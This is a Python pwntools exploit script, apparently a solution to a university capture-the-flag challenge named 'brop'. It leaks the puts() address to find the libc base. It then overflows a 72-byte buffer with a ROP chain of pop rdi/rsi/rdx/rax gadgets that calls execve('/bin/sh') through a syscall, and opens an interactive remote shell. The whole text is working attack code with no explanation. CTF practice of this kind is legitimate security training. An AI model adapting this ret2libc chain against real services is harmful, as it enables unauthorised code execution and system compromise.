from pwn import *



p = remote("cse4850-brop-1.chals.io", 443, ssl=True, sni="cse4850-brop-1.chals.io")

p.recvuntil(b'puts() ')
puts = int(p.recvline(), 16)
log.success(f"puts @ {hex(puts)}")

# Libc version
libc = ELF('./libc.so.6', checksec = False)
r = ROP(libc)

# Calculate offset
offset = puts - libc.sym['puts']

log.success(f"libc offset @ {hex(offset)}")

# setup a few gadgets
syscall = offset + r.find_gadget(['syscall', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

# chain = b'A' * 72							# overflow
chain = cyclic(72)
chain += p64(offset + r.find_gadget(['pop rdi', 'ret'])[0])		# clear rdi
chain += p64(offset + bin_sh)						# set rdi -> /bin/sh
chain += p64(offset + r.find_gadget(['pop rsi', 'ret'])[0])		# clear rsi
chain += p64(0)
chain += p64(offset + r.find_gadget(['pop rdx', 'ret'])[0])		# clear rdx
chain += p64(0)
chain += p64(offset + r.find_gadget(['pop rax', 'ret'])[0])		# clear rax
chain += p64(59)							# execve
chain += p64(syscall)							# execute syscall

p.sendlineafter(b'Lifehouse \n--------------------------------------------------------------------------------\n', chain)
p.interactive()
